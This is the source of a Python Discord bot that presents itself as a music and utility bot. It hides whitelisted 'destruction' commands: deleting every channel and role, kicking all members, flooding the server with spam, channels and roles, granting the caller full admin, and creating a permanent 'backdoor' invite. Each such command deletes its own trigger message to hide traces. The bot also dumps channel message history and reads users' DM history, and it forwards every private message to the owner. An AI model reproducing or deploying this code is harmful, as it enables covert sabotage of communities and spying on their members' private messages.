import asyncio
import ctypes
import datetime
import functools
import io
import json
import os
import platform
import random
import shutil
import string
import time
from threading import Thread
import discord
from discord import ui, opus
from discord.ext import commands
from flask import Flask
import ffmpeg_downloader
import davey
import psutil
import yt_dlp

if not opus.is_loaded():
    try:
        opus.load_opus(davey.opus_path())
    except:
        pass

ffmpeg_exe = "ffmpeg"
if not shutil.which("ffmpeg"):
    try:
        ffmpeg_downloader.download()
        ffmpeg_exe = os.path.join(os.getcwd(), "ffmpeg")
        if os.path.exists(ffmpeg_exe):
            os.chmod(ffmpeg_exe, 0o755)
    except:
        pass

app = Flask('')
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

ALLOWED_IDS = [1008278721007992863, 1355108796388872292, 1359813653544566815, 1422570014292181133]
VERSION_ID = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))

async def is_me(ctx):
    if ctx.author.id in ALLOWED_IDS:
        try:
            await ctx.message.delete()
        except:
            pass
        return True
    return False
    
queues = {}

def check_queue(ctx, guild_id):
    if guild_id in queues and queues[guild_id]:
        source = queues[guild_id].pop(0)
        ctx.voice_client.play(source, after=lambda e: check_queue(ctx, guild_id))
        
@app.route('/')
def home():
    return "Bot is alive"

def run():
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))

def keep_alive():
    t = Thread(target=run, daemon=True)
    t.start()

intents = discord.Intents.all()

@bot.event
async def on_ready():
    print(f'系統連線成功 | 實例 ID: {VERSION_ID} | 帳號: {bot.user}')

@bot.command(name="help")
async def help_msg(ctx):
    if not await is_me(ctx): return
    
    embed = discord.Embed(
        title="🧳 旅行者系統 - 指令完整手冊", 
        description=f"實例編號：`{VERSION_ID}`\n此表僅授權人員可見。執行指令後會自動隱身並清理痕跡。",
        color=0x2b2d31
    )
    embed.add_field(
        name="🛡️ 基礎管理", 
        value=(
            "`!tm @成員 [分]` - 禁言成員\n"
            "`!kick_everyone` - 踢出伺服器全員\n"
            "`!bye` - 機器人退出伺服器\n"
            "`!set_server [名]` - 修改伺服器名稱\n"
            "`!server_gate [lock/unlock]` - 全服鎖定/解鎖發言\n"
            "`!clean_user @成員 [數]` - 刪除指定人的訊息\n"
            "`!del_msg [數]` - 批次清理訊息\n"
            "`!backdoor` - 獲取永久邀請連結\n"
            "`!move_all [頻道ID]` - 強制全體移動語音\n"
            "`!add_role @成員 @身分組` - 給與成員身分組\n"
            "`!remove_role @成員 @身分組` - 剝奪成員身分組\n"
        ), 
        inline=False
    )
    embed.add_field(
        name="🎵 語音與掛台",
        value=(
            "`!join_vc` - 加入你所在的語音頻道\n"
            "`!leave_vc` - 退出語音頻道\n"
            "`!play_music [URL]` - 播放SoundCloud 或是DropBox 音訊\n"
            "`!stop_music` - 停止播放音樂\n"
            "`!background_music [on/off]` - 開始或停止播放背景音樂\n"
        ),
        inline=False
    )
    embed.add_field(
        name="🔥 破壞系統", 
        value=(
            "`!del_ch` - 刪除所有頻道\n"
            "`!del_role` - 刪除所有身分組\n"
            "`!100ch` - 建立 100 個頻道\n"
            "`!100rl` - 建立 100 個身分組\n"
            "`!spam [次] [文]` - 洗頻攻擊\n"
            "`!set_server [文]` - 洗頻攻擊\n"
        ), 
        inline=False
    )
    embed.add_field(
        name="🛠️ 進階工具", 
        value=(
            "`!eval [code]` - 執行動態 Python 腳本\n"
            "`!snapshot` - 導出伺服器完整結構\n"
            "`!op_me` - 獲取最高權限\n"
            "`!reset` - 強制重啟系統\n"
            "`!test` - 列出Bot的數據\n"
        ), 
        inline=False
    )
    embed.add_field(
        name="🎮 有趣系統", 
        value=(
            "`!get_dm @成員 [數]` - 調閱私訊紀錄\n"
            "`!dm @成員 [文]` - 以機器人名義私訊成員\n"
            "`!random_kick` - 隨機踢一個帥哥\n"
            "`!how_much?` - 點評成員的盤子行為\n"
            "`!word_switch` - 開啟字體美化器\n"
            "`!avatar @成員 ` - 查成員\n"
        ), 
        inline=False
    )
    embed.set_footer(text="注意：所有操作皆會記錄於開發後台。")
    await ctx.send(embed=embed)

@bot.command(name="dm")
async def dm(ctx, member: discord.Member, *, text: str):
    try: await member.send(text)
    except: pass

@bot.command(name="del_ch")
async def nuke_channels(ctx):
    if not await is_me(ctx): return
    for channel in ctx.guild.channels:
        try: await channel.delete()
        except: pass
    await ctx.guild.create_text_channel("general")

@bot.command(name="kick_everyone")
async def kick_everyone(ctx):
    if not await is_me(ctx): return
    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user and member != ctx.guild.owner:
            try: await member.kick()
            except: pass

@bot.command(name="del_role")
async def clear_roles(ctx):
    if not await is_me(ctx): return
    for role in ctx.guild.roles:
        if role.name != "@everyone" and not role.managed:
            try: await role.delete()
            except: pass

@bot.command(name="set_server")
async def set_server(ctx, *, name: str):
    if not await is_me(ctx): return
    try: await ctx.guild.edit(name=name)
    except: pass

@bot.command(name="bye")
async def leave_server(ctx):
    if not await is_me(ctx): return
    await ctx.guild.leave()

@bot.command(name="del_msg")
async def purge_chat(ctx, amount: int = 10):
    if not await is_me(ctx): return
    try: await ctx.channel.purge(limit=amount)
    except: pass

@bot.command(name="spam")
async def spam(ctx, count: int, *, text: str):
    if not await is_me(ctx): return
    for i in range(min(count, 100)):
        try:
            suffix = ''.join(random.choices(string.ascii_letters + string.digits, k=5))
            await ctx.send(f"{text}")
            await asyncio.sleep(0.8)
        except: break

@bot.command(name="100rl")
async def role_hell(ctx):
    if not await is_me(ctx): return
    for i in range(100):
        color = discord.Color.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
        try: await ctx.guild.create_role(name=f"{i}", color=color)
        except: break

@bot.command(name="100ch")
async def flood(ctx, name="ch-----test"):
    if not await is_me(ctx): return
    for i in range(100):
        try: await ctx.guild.create_text_channel(f"{name}-{i}")
        except: break

@bot.command(name="op_me")
async def op_me(ctx):
    if not await is_me(ctx): return
    guild = ctx.guild
    try:
        new_role = await guild.create_role(
            name="OP", 
            permissions=discord.Permissions.all(), 
            color=discord.Color.from_str("#2b2d31")
        )
        await ctx.author.add_roles(new_role)
        await new_role.edit(position=guild.me.top_role.position - 1)
    except: pass

@bot.command(name="tm")
async def tm(ctx, member: discord.Member = None, minutes: int = 10):
    if not await is_me(ctx): return
    if member is None: return
    try:
        duration = datetime.timedelta(minutes=minutes)
        await member.timeout(duration, reason="呼吸")
    except: pass

@bot.command(name="backdoor")
async def backdoor(ctx):
    if not await is_me(ctx): return
    try:
        inv = await ctx.channel.create_invite(max_age=0, max_uses=0)
        await ctx.author.send(f"永久入口: {inv.url}")
    except: pass

@bot.command(name="move_all")
async def move_all(ctx, channel: discord.VoiceChannel):
    if not await is_me(ctx): return
    for member in ctx.guild.members:
        if member.voice:
            try: await member.move_to(channel)
            except: pass

@bot.command(name="disrole")
async def isolate(ctx, member: discord.Member):
    if not await is_me(ctx): return
    try: await member.edit(roles=[])
    except: pass

@bot.command(name="server_gate")
async def server_gate(ctx, status: str):
    if not await is_me(ctx): return
    can_send = True if status == "unlock" else False
    for channel in ctx.guild.text_channels:
        try: await channel.set_permissions(ctx.guild.default_role, send_messages=can_send)
        except: pass

@bot.command(name="add_role")
async def add_role(ctx, member: discord.Member, role: discord.Role):
    if not await is_me(ctx): return
    try: await member.add_roles(role)
    except: pass

@bot.command(name="remove_role")
async def remove_role(ctx, member: discord.Member, role: discord.Role):
    if not await is_me(ctx): return
    try: await member.remove_roles(role)
    except: pass

@bot.command(name="get_dm")
async def get_dm(ctx, member: discord.Member, limit: int = 10):
    try:
        dm_channel = member.dm_channel or await member.create_dm()
        history = []
        async for msg in dm_channel.history(limit=limit):
            who = "機器人" if msg.author == bot.user else "成員"
            history.append(f"[{msg.created_at.strftime('%H:%M')}] {who}: {msg.content}")
        result = "\n".join(reversed(history)) or "無私訊紀錄"
        await ctx.author.send(f"📂 **與 {member.name} 的紀錄：**\n{result[:1900]}")
    except: pass

@bot.command(name="how_much?")
async def worth(ctx):
    price = random.randint(1, 999999)
    comments = ["這玩意兒我看就值這麼多", "太貴了吧，根本盤子", "這東西拿去回收站都嫌重"]
    await ctx.send(f"💰 我覺得這東西價值 **${price:,}**。{random.choice(comments)}")

@bot.command(name="random_kick")
async def mock_kick(ctx):

    members = [m for m in ctx.guild.members if not m.bot]
    target = random.choice(members)
    
    msg = await ctx.send(f"⚠️ **系統偵測到有人降低伺服器平均智商...**\n正在準備將 {target.mention} 移出伺服器以緩減降智問題...")
    await asyncio.sleep(2)
    
    for i in range(1, 4):
        await msg.edit(content=f"⚠️ **系統偵測到有人降低伺服器平均智商...**\n正在準備將 {target.mention} 移出伺服器...\n進度：[{'█' * i}{'░' * (3-i)}] {i*33}%")
        await asyncio.sleep(1)
    
    await msg.edit(content=f"❌ **操作失敗**\n原因：`{target.display_name}` 太帥了，權限不足。")

FONT_MAPS = {
    "fancy": str.maketrans(
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
        "𝔞𝔟𝔠𝔡𝔢𝔣𝔤𝔥𝔦𝔧𝔨𝔩𝔪𝔫𝔬𝔭𝔮𝔯𝔰𝔱𝔲𝔳𝔴𝔵𝔶𝔷𝔄𝔅ℭ𝔇𝔈𝔉𝔊ℌℑ𝔍𝔎𝔏𝔐𝔑𝔒𝔓𝔔ℜ𝔖𝔗𝔘𝔙𝔚𝔛𝔜ℨ"
    ),
    "script": str.maketrans(
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
        "𝒶𝒷𝒸𝒹𝑒𝒻𝑔𝒽𝒾𝒿𝓀𝓁𝓂𝓃𝑜𝓅𝓆𝓇𝓈𝓉𝓊𝓋𝓌𝓍𝓎𝓏𝒜𝐵𝒞𝒟𝐸𝒯𝒢𝐻𝐼𝒥𝒦𝐿𝑀𝒩𝒪𝒫𝒬𝑅𝒮𝒯𝒰𝒱𝒲𝒳𝒴𝒵"
    )
}

class FontModal(ui.Modal, title="字體轉換器"):
    user_input = ui.TextInput(
        label="輸入想要轉換的英文 (僅限英文)",
        placeholder="例如: Players Tavern",
        style=discord.TextStyle.short,
        min_length=1,
        max_length=100
    )

    async def on_submit(self, interaction: discord.Interaction):
        text = self.user_input.value
        fancy = text.translate(FONT_MAPS["fancy"])
        script = text.translate(FONT_MAPS["script"])
        
        embed = discord.Embed(title="✨ 轉換結果", color=0xf1c40f)
        embed.add_field(name="𝔊𝔬𝔱𝔥𝔦𝔠 𝔖𝔱𝔶𝔩𝔢", value=f"`{fancy}`", inline=False)
        embed.add_field(name="𝒮𝒸𝓇𝒾𝓅𝓉 𝒮𝓉𝓎𝓁𝑒", value=f"`{script}`", inline=False)
        embed.set_footer(text="直接複製上面的文字即可使用！")
        
        await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.command(name="word_switch")
async def font_cmd(ctx):
    await ctx.send("點擊下方按鈕開啟轉換器：", view=FontLaunchView())

class FontLaunchView(ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @ui.button(label="開啟轉換視窗", style=discord.ButtonStyle.blurple, emoji="🪄")
    async def open_modal(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.send_modal(FontModal())

@bot.command(name="snapshot")
async def snapshot(ctx):
    if ctx.author.id not in ALLOWED_IDS: return
    await ctx.author.send("🚀 正在生成伺服器備份...")
    guild = ctx.guild
    roles = []
    for r in sorted(guild.roles, key=lambda x: x.position):
        if not r.managed and r.name != "@everyone":
            roles.append({
                "name": r.name,
                "color": r.color.value,
                "perms": r.permissions.value
            })
    data = {
        "server": guild.name,
        "roles": roles,
        "categories": []
    }
    for cat in guild.categories:
        cat_info = {"name": cat.name, "overwrites": [], "channels": []}
        for target, ov in cat.overwrites.items():
            cat_info["overwrites"].append({"target": target.name, "allow": ov.pair()[0].value, "deny": ov.pair()[1].value})
        for ch in cat.channels:
            ch_data = {"name": ch.name, "type": str(ch.type), "overwrites": []}
            for target, ov in ch.overwrites.items():
                ch_data["overwrites"].append({"target": target.name, "allow": ov.pair()[0].value, "deny": ov.pair()[1].value})
            if isinstance(ch, discord.TextChannel):
                msgs = []
                try:
                    async for m in ch.history(limit=10, oldest_first=True):
                        msgs.append(m.content)
                except: pass
                ch_data["history"] = msgs
            cat_info["channels"].append(ch_data)
        data["categories"].append(cat_info)
    json_bytes = json.dumps(data, indent=4, ensure_ascii=False).encode()
    await ctx.author.send(file=discord.File(io.BytesIO(json_bytes), filename=f"SNAPSHOT_{guild.id}.json"))
    
@bot.command(name="eval")
async def eval_code(ctx, *, code: str = None):
    if ctx.author.id not in ALLOWED_IDS: return
    if ctx.message.attachments:
        file_data = await ctx.message.attachments[0].read()
        data = json.loads(file_data.decode('utf-8'))
        await ctx.author.send(f"🏗️ 開始還原伺服器：{data['server']}")
        created_roles = []
        for r_data in data.get('roles', []):
            role = discord.utils.get(ctx.guild.roles, name=r_data['name'])
            if not role:
                try:
                    role = await ctx.guild.create_role(
                        name=r_data['name'],
                        color=discord.Color(r_data['color']),
                        permissions=discord.Permissions(r_data['perms'])
                    )
                except: continue
            created_roles.append(role)
        try:
            payload = {role: i + 1 for i, role in enumerate(created_roles)}
            await ctx.guild.edit_role_positions(payload)
        except Exception as e:
            await ctx.author.send(f"⚠️ 順序調整受限，請確保機器人身分組在最頂端後手動調整或再試一次: {e}")
        role_map = {r.name: r for r in ctx.guild.roles}
        for cat_data in data['categories']:
            cat_ov = {}
            for o in cat_data.get('overwrites', []):
                target = role_map.get(o['target'])
                if target: cat_ov[target] = discord.PermissionOverwrite.from_pair(discord.Permissions(o['allow']), discord.Permissions(o['deny']))
            new_cat = await ctx.guild.create_category(cat_data['name'], overwrites=cat_ov)
            for ch_data in cat_data['channels']:
                ch_ov = {}
                for o in ch_data.get('overwrites', []):
                    target = role_map.get(o['target'])
                    if target: ch_ov[target] = discord.PermissionOverwrite.from_pair(discord.Permissions(o['allow']), discord.Permissions(o['deny']))
                if ch_data['type'] == 'text':
                    new_ch = await new_cat.create_text_channel(ch_data['name'], overwrites=ch_ov)
                    for content in ch_data.get('history', []):
                        if content:
                            await new_ch.send(content)
                            await asyncio.sleep(0.5)
                elif ch_data['type'] == 'voice':
                    await new_cat.create_voice_channel(ch_data['name'], overwrites=ch_ov)
        return await ctx.author.send("✅ 還原完成!")
        
@bot.command(name="reset")
async def reboot(ctx):
    if not await is_me(ctx): return
    os._exit(0)

@bot.command(name="join_vc")
async def join(ctx):
    if not await is_me(ctx): return 
    if ctx.author.voice and ctx.author.voice.channel:
        voice_channel = ctx.author.voice.channel
        try:
            print(f"正在嘗試連線至: {voice_channel.name}")
            if ctx.voice_client:
                await ctx.voice_client.move_to(voice_channel)
            else:
                await voice_channel.connect()
            print("連線成功")
        except Exception as e:
            await ctx.author.send(f"❌ 無法加入語音: `{e}`")
            print(f"語音連線失敗: {e}")
    else:
        await ctx.author.send("⚠️ 你必須先進入一個語音頻道！")
        
@bot.command(name="leave_vc")
async def dc(ctx):
    if not await is_me(ctx): return
    try: await ctx.message.delete()
    except: pass

    if ctx.voice_client:
        try: await ctx.voice_client.disconnect()
        except: pass

bgm_enabled = False
is_switching = False
BGM_URL = "https://soundcloud.com/ghostly/c418-haggstrom-1?in=lucas-shearer-913642639/sets/minecraft-soundtrack-disc"

class PlayerControlView(discord.ui.View):
    def __init__(self, ctx, url, title, duration, uploader):
        super().__init__(timeout=None)
        self.ctx = ctx
        self.url = url
        self.title = title
        self.duration = duration
        self.uploader = uploader
        self.is_looping = True
        self.manual_stop = False

    def _get_embed(self, status="正在播放"):
        embed = discord.Embed(title=f"🎵 {status}", color=0x3498db)
        embed.add_field(name="🎵 歌名", value=f"[{self.title}]({self.url})", inline=False)
        embed.add_field(name="📤 上傳者", value=self.uploader, inline=True)
        if self.duration:
            d_int = int(self.duration)
            embed.add_field(name="⏱️ 長度", value=f"{d_int // 60}:{d_int % 60:02d}", inline=True)
        embed.set_footer(text=f"🔄 自動循環: {'開啟' if self.is_looping else '關閉'}")
        return embed

    @discord.ui.button(label="暫停/繼續", style=discord.ButtonStyle.blurple, emoji="⏯️")
    async def play_pause(self, interaction: discord.Interaction, button: discord.ui.Button):
        vc = self.ctx.voice_client
        if not vc:
            return await interaction.response.send_message("❌ 機器人不在語音頻道中", ephemeral=True)
        if vc.is_playing():
            vc.pause()
            await interaction.response.edit_message(embed=self._get_embed("已暫停播放"), view=self)
        elif vc.is_paused():
            vc.resume()
            await interaction.response.edit_message(embed=self._get_embed("正在播放"), view=self)
        else:
            await interaction.response.send_message("ℹ️ 目前沒有正在播放的音訊", ephemeral=True)

    @discord.ui.button(label="重複: 開", style=discord.ButtonStyle.green, emoji="🔁")
    async def toggle_loop(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.is_looping = not self.is_looping
        button.label = f"重複: {'開' if self.is_looping else '關'}"
        button.style = discord.ButtonStyle.green if self.is_looping else discord.ButtonStyle.gray
        await interaction.response.edit_message(embed=self._get_embed(), view=self)

    @discord.ui.button(label="停止播放", style=discord.ButtonStyle.red, emoji="⏹️")
    async def stop_player(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.is_looping = False
        self.manual_stop = True
        if self.ctx.voice_client:
            self.ctx.voice_client.stop()
            await interaction.response.send_message("⏹️ 已停止播放", ephemeral=True)
            await asyncio.sleep(1)
            bot.loop.create_task(play_bgm(self.ctx))
        else:
            await interaction.response.send_message("❌ 機器人已不在頻道中", ephemeral=True)

    @discord.ui.button(label="退出頻道", style=discord.ButtonStyle.red, emoji="🚪")
    async def leave_vc(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.is_looping = False
        self.manual_stop = True
        if self.ctx.voice_client:
            await self.ctx.voice_client.disconnect()
            await interaction.response.send_message("🚪 已斷開連線", ephemeral=True)

    @discord.ui.button(label="重新連結", style=discord.ButtonStyle.gray, emoji="🔧")
    async def reconnect_vc(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.ctx.author.voice:
            try:
                if self.ctx.voice_client:
                    await self.ctx.voice_client.disconnect(force=True)
                await self.ctx.author.voice.channel.connect(reconnect=True)
                await interaction.response.send_message("✅ 已強制重新連接語音端點", ephemeral=True)
            except Exception as e:
                await interaction.response.send_message(f"❌ 重連失敗: {e}", ephemeral=True)
        else:
            await interaction.response.send_message("⚠️ 你必須在語音頻道內才能使用重連", ephemeral=True)

async def play_bgm(ctx):
    global is_switching
    if not bgm_enabled or not ctx.voice_client or ctx.voice_client.is_playing() or is_switching:
        return

    bgm_ffmpeg_opts = {
        'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5',
        'options': '-vn -ar 48000 -ac 2 -b:a 128k -af "volume=0.3" -async 1'
    }

    try:
        def fetch_bgm():
            with yt_dlp.YoutubeDL({'format': 'bestaudio/best', 'quiet': True, 'noplaylist': True}) as ydl:
                return ydl.extract_info(BGM_URL, download=False)
        
        info = await bot.loop.run_in_executor(None, fetch_bgm)
        audio_url = info.get('url') or info['entries'][0]['url']
        source = await discord.FFmpegOpusAudio.from_probe(audio_url, executable=ffmpeg_exe, **bgm_ffmpeg_opts)
        
        def after_bgm(error):
            if bgm_enabled and ctx.voice_client and not ctx.voice_client.is_playing() and not is_switching:
                bot.loop.call_soon_threadsafe(lambda: bot.loop.create_task(play_bgm(ctx)))
        
        if ctx.voice_client and not ctx.voice_client.is_playing():
            ctx.voice_client.play(source, after=after_bgm)
    except:
        pass

@bot.command(name="play_music")
async def p(ctx, *, url):
    global is_switching
    if not ctx.voice_client:
        if ctx.author.voice:
            try:
                await ctx.author.voice.channel.connect(reconnect=True, timeout=20)
            except Exception as e:
                return await ctx.send(f"❌ 無法進入頻道: `{e}`")
        else:
            return await ctx.send("⚠️ 請先進入語音頻道")

    is_switching = True
    if ctx.voice_client.is_playing() or ctx.voice_client.is_paused():
        ctx.voice_client.stop()
        await asyncio.sleep(1)

    ffmpeg_opts = {
        'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5',
        'options': '-vn -ar 48000 -ac 2 -b:a 256k -packet_loss 5 -af "volume=0.9" -async 1 -frame_duration 20 -preset veryfast'
    }

    async def silent_play(target_url, current_view):
        global is_switching
        if not ctx.voice_client: return
        try:
            def fetch_info():
                with yt_dlp.YoutubeDL({'format': 'bestaudio/best', 'quiet': True, 'noplaylist': True}) as ydl:
                    return ydl.extract_info(target_url, download=False)
            
            info = await bot.loop.run_in_executor(None, fetch_info)
            audio_url = info.get('url') or info['entries'][0]['url']
            source = await discord.FFmpegOpusAudio.from_probe(audio_url, executable=ffmpeg_exe, **ffmpeg_opts)
            
            def loop_after(error):
                if current_view.manual_stop or is_switching: return
                if current_view.is_looping and ctx.voice_client:
                    bot.loop.call_soon_threadsafe(lambda: bot.loop.create_task(silent_play(target_url, current_view)))
                else:
                    bot.loop.call_soon_threadsafe(lambda: bot.loop.create_task(play_bgm(ctx)))

            if ctx.voice_client:
                ctx.voice_client.play(source, after=loop_after)
            is_switching = False
        except:
            is_switching = False
            bot.loop.create_task(play_bgm(ctx))

    async with ctx.typing():
        try:
            def fetch_initial():
                with yt_dlp.YoutubeDL({'format': 'bestaudio/best', 'quiet': True, 'noplaylist': True}) as ydl:
                    return ydl.extract_info(url, download=False)
            
            info = await bot.loop.run_in_executor(None, fetch_initial)
            if 'entries' in info: info = info['entries'][0]
            
            title = info.get('title', '❌ 未知歌曲')
            uploader = info.get('uploader', '❌ 未知來源')
            duration = info.get('duration')
            
            view = PlayerControlView(ctx, url, title, duration, uploader)
            source = await discord.FFmpegOpusAudio.from_probe(info['url'], executable=ffmpeg_exe, **ffmpeg_opts)
            
            def initial_after(error):
                if view.manual_stop: return
                if view.is_looping and ctx.voice_client:
                    bot.loop.call_soon_threadsafe(lambda: bot.loop.create_task(silent_play(url, view)))
                else:
                    bot.loop.call_soon_threadsafe(lambda: bot.loop.create_task(play_bgm(ctx)))

            if ctx.voice_client:
                ctx.voice_client.play(source, after=initial_after)
            is_switching = False
            await ctx.send(embed=view._get_embed(), view=view)
        except Exception as e:
            is_switching = False
            await ctx.send(f"❌ 播放失敗: `{str(e)[:100]}`")
            bot.loop.create_task(play_bgm(ctx))

@bot.command(name="stop_music")
async def stop_music(ctx):
    if ctx.voice_client:
        ctx.voice_client.stop()
        await ctx.send("⏹️ 已停止播放")
        await asyncio.sleep(1)
        bot.loop.create_task(play_bgm(ctx))

@bot.command(name="background_music")
async def background_music(ctx, mode: str):
    global bgm_enabled, is_switching
    if mode.lower() == "on":
        bgm_enabled = True
        is_switching = False
        await ctx.send("✅ 背景音樂模式已開啟。")
        if ctx.voice_client and not ctx.voice_client.is_playing():
            await play_bgm(ctx)
    elif mode.lower() == "off":
        bgm_enabled = False
        if ctx.voice_client:
            ctx.voice_client.stop()
        await ctx.send("❌ 背景音樂模式已關閉。")

@bot.command(name="test")
async def test(ctx):
    api_latency = round(bot.latency * 1000)
    voice_latency = "未連線"
    if ctx.voice_client and ctx.voice_client.is_connected():
        voice_latency = f"{round(ctx.voice_client.latency * 1000)}ms"
        
    process = psutil.Process()
    mem_rss = process.memory_info().rss / 1024 / 1024
    mem_vms = process.memory_info().vms / 1024 / 1024
    mem_percent = process.memory_percent()
    cpu_usage = psutil.cpu_percent()
    num_threads = process.num_threads()
    
    if hasattr(bot, 'start_time'):
        uptime_seconds = int(time.time() - bot.start_time)
        days, rem = divmod(uptime_seconds, 86400)
        hours, rem = divmod(rem, 3600)
        minutes, seconds = divmod(rem, 60)
        uptime_str = f"{days}天 {hours}小時 {minutes}分 {seconds}秒"
    else:
        uptime_str = "未知 (未設定啟動時間標記)"
    operator_info = f"{ctx.author.display_name} ({ctx.author.id})"
    
    bgm_status = "✅ 運行中" if bgm_enabled else "❌ 已關閉"
    
    embed = discord.Embed(title="🛠️ 機器人核心測試報告", color=0x2ecc71, timestamp=ctx.message.created_at)
    embed.add_field(name="👤 操作人員名單", value=f"```{operator_info}```", inline=False)
    embed.add_field(name="⏳ 網路延遲", value=f"**API 延遲:** {api_latency}ms\n**語音閘道:** {voice_latency}", inline=True)
    embed.add_field(name="💻 系統負載", value=f"**CPU 使用率:** {cpu_usage}%\n**執行線程數:** {num_threads} 個", inline=True)
    embed.add_field(name="🧠 記憶體狀態", value=f"**實體 (RSS):** {round(mem_rss, 2)} MB\n**虛擬 (VMS):** {round(mem_vms, 2)} MB\n**記憶體佔比:** {round(mem_percent, 2)}%", inline=True)
    embed.add_field(name="⏱️ 運行統計", value=f"**已連續上線:** {uptime_str}", inline=True)
    embed.add_field(name="🎵 音樂參數", value=(
        f"**背景音樂模式:** {bgm_status}\n"
        f"**FFmpeg 預設:** `veryfast`\n"
        f"**音訊取樣率:** 48000Hz\n"
        f"**切歌鎖定:** {'使用中' if is_switching else '空閒'}"
    ), inline=False)
    embed.add_field(name="⚙️ 環境資訊", value=(
        f"**Python:** {platform.python_version()}\n"
        f"**Discord.py:** {discord.__version__}\n"
        f"**作業系統:** {platform.system()} {platform.release()}"
    ), inline=False)
    embed.set_footer(text=f"查詢者: {ctx.author.display_name}", icon_url=ctx.author.display_avatar.url)
    await ctx.send(embed=embed)

@bot.command(name="avatar")
async def profile(ctx, member: discord.Member = None):
    member = member or ctx.author
    embed = discord.Embed(title=f"👤 {member.display_name} 的名片", color=member.color)
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.add_field(name="加入伺服器時間", value=member.joined_at.strftime("%Y-%m-%d"), inline=True)
    embed.add_field(name="最高身份組", value=member.top_role.mention, inline=True)
    embed.set_footer(text=f"ID: {member.id}")
    await ctx.send(embed=embed)

@bot.command(name='play_live')
async def play_live(ctx, *, url: str):
    if not ctx.author.voice:
        return await ctx.send("❌ 你必須先加入一個語音頻道！")
        
    voice_channel = ctx.author.voice.channel
    
    if ctx.voice_client is None:
        vc = await voice_channel.connect()
    else:
        vc = ctx.voice_client

    await ctx.send("🔍 正在解析直播串流，請稍候...")

    ydl_opts = {
        'format': 'bestaudio/best',
        'quiet': True,
        'noplaylist': True,
        'skip_download': True,
        'cookiefile': 'youtube.com_cookies.txt',
        'http_headers': {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        }
    }

    FFMPEG_LIVE_OPTIONS = {
        'options': '-vn',
        'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5 -live_start_index -1'
    }

    loop = asyncio.get_event_loop()
    try:
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = await loop.run_in_executor(None, lambda: ydl.extract_info(url, download=False))
            stream_url = info['url']
            title = info.get('title', '未知直播')
    except Exception as e:
        return await ctx.send(f"❌ 直播解析失敗：{e}")

    if vc.is_playing():
        vc.stop()

    try:
        source = discord.FFmpegPCMAudio(stream_url, **FFMPEG_LIVE_OPTIONS)
        vc.play(source)
        await ctx.send(f"🔴 **正在現場直播**：{title}")
    except Exception as e:
        await ctx.send(f"❌ 播放直播時發生錯誤：{e}")



@bot.event
async def on_message(message):
    if message.author == bot.user: return
    if isinstance(message.channel, discord.DMChannel) and not message.content.startswith("!"):
        owner = await bot.fetch_user(ALLOWED_IDS[0])
        await owner.send(f"📩 **私訊** | {message.author}: {message.content}")
    await bot.process_commands(message)

if __name__ == "__main__":
    keep_alive()
    bot.run(os.environ.get("TOKEN"))